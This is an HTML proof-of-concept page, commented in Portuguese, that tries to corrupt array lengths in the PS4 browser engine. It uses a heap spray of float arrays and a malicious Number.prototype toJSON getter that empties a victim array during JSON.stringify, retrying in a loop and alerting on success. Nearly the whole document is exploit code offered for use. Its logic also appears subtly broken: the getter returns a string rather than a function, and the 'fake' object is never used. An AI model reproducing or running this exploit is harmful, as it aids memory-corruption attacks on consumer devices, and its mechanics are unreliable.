<!DOCTYPE html>
<html>
<head>
    <title>PS4 JSON Length Smasher (PoC)</title>
    <style>
        body { background: #001; color: #0f0; font-family: monospace; padding: 20px; font-size: 20px; }
        #log { border: 1px solid #0f0; padding: 10px; height: 80vh; overflow-y: auto; }
        .success { color: #fff; background: #0a0; font-weight: bold; padding: 5px; }
        .fail { color: #888; }
    </style>
</head>
<body>
    <h3>POC: JSON INTERRUPT ARRAY LENGTH</h3>
    <div id="log">Iniciando...</div>

    <script>
        const logDiv = document.getElementById('log');
        function log(msg, type='') {
            logDiv.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // 1. CONFIGURAÇÃO DO HEAP
        // Criamos arrays "vítima" que queremos corromper
        let victims = [];
        const TARGET_LEN = 0x10; // Tamanho original pequeno (16)

        function setup() {
            victims = [];
            for(let i=0; i<100; i++) {
                // Array de Floats (estrutura simples na memória)
                let a = [1.1, 2.2, 3.3, 4.4];
                a.target = true; // Marcador
                victims.push(a);
            }
        }

        // 2. O GATILHO (JSON Trap)
        function runAttack() {
            let success = false;

            // Definimos o getter malicioso no protótipo
            // O JSON.stringify vai chamar isso para cada número que tentar ler
            Object.defineProperty(Number.prototype, "toJSON", {
                get: function() {
                    // AQUI É O ATAQUE:
                    // O motor C++ está lendo o array.
                    // Nós esvaziamos o array debaixo dos pés dele.
                    // Se o C++ não checar de novo, ele vai escrever o resultado
                    // fora do buffer (agora pequeno), corrompendo o vizinho.
                    
                    if (victims.length > 0) {
                        // Esvazia o primeiro array vítima
                        victims[0].length = 0; 
                        
                        // Tenta preencher o buraco com um objeto que tem um tamanho (length) falso
                        // Se funcionar, o C++ escreve o 'length' falso no lugar errado
                        let fake = { length: 0x1000 }; 
                    }
                    
                    return "hacked";
                }
            });

            try {
                // Cria um array isca
                let bait = [1.1, 2.2];
                
                // Dispara a serialização
                // Isso vai chamar o Number.prototype.toJSON acima
                JSON.stringify(bait);
                
            } catch(e) {}

            // 3. VERIFICAÇÃO
            // Checamos se algum array ficou com tamanho gigante
            for(let i=0; i<victims.length; i++) {
                if (victims[i].length > 4 && victims[i].length < 1000000) {
                    log(`SUCESSO! Array[${i}] corrompido! Len: ${victims[i].length}`, "success");
                    success = true;
                    alert("POC SUCCESS: Array Length Corrupted!");
                }
            }

            // Limpeza
            delete Number.prototype.toJSON;
            return success;
        }

        async function loop() {
            let tries = 0;
            while(tries < 50) {
                tries++;
                setup();
                let result = runAttack();
                
                if (result) return; // Parar se conseguir
                
                if (tries % 10 === 0) log(`Tentativa ${tries}: Falha (seguro)`, "fail");
                
                await new Promise(r => setTimeout(r, 100));
            }
            log("Teste finalizado. Nenhuma corrupção de 'length' detectada com este vetor.", "fail");
        }

        setTimeout(loop, 1000);

    </script>
</body>
</html>
